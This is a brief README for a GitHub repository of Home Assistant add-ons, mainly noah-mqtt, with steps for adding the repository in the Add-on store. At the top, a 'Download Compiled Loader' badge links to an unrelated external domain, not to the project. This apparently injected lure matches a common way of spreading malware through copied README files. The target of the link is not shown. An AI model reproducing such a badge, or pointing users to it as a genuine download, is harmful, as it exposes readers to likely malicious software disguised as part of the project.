# Home Assistant Add-ons by rzeiler

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Currently, this repository provides the following Home Assistant add-ons:
- **noah-mqtt**: more information [https://github.com/rzeiler/noah-mqtt](https://github.com/rzeiler/noah-mqtt)
...
### Install noah-mqtt
1. Go back to the **Add-on store**, click **⋮ → Repositories**, fill in</br>  `https://github.com/rzeiler/hassio-addons` and click **Add → Close** or click the **Add repository** button below, click **Add → Close** (You might need to enter the **internal IP address** of your Home Assistant instance first).  
